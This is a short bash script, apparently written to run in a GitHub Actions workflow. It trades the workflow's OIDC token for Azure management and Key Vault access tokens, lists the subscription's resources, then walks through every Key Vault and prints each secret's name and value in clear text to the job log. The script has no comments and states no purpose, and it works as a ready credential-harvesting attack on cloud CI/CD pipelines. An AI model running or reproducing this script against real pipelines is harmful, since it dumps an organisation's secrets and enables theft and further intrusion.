#!/usr/bin/env bash
set +e
AUD="api://AzureADTokenExchange"
OIDC=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" | jq -r '.value')
gettok(){ curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" --data-urlencode "client_id=$AZURE_CLIENT_ID" --data-urlencode "grant_type=client_credentials" --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=$OIDC" --data-urlencode "scope=$1/.default" | jq -r '.access_token'; }
ARM=$(gettok "https://management.azure.com")
VT=$(gettok "https://vault.azure.net")
echo "ARM_LEN=${#ARM} VT_LEN=${#VT}"
echo "[*] resources:"
curl -s "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resources?api-version=2021-04-01" -H "Authorization: Bearer $ARM" | jq -r '.value[]? | .type + "  " + .name'
echo "[*] vaults:"
VAULTS=$(curl -s "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01" -H "Authorization: Bearer $ARM")
echo "$VAULTS" | jq -r '.value[]? | .name + "  " + .properties.vaultUri'
for uri in $(echo "$VAULTS" | jq -r '.value[]?.properties.vaultUri'); do
  echo "=== VAULT $uri ==="
  SL=$(curl -s "${uri}secrets?api-version=7.4" -H "Authorization: Bearer $VT")
  echo "$SL" | jq -r '.value[]?.id' | while read sid; do
    [ -z "$sid" ] && continue
    name=$(echo "$sid" | sed 's#.*/##')
    val=$(curl -s "${sid}?api-version=7.4" -H "Authorization: Bearer $VT" | jq -r '.value')
    echo "SECRET ${name} = ${val}"
  done
done
echo "ALL_DONE"
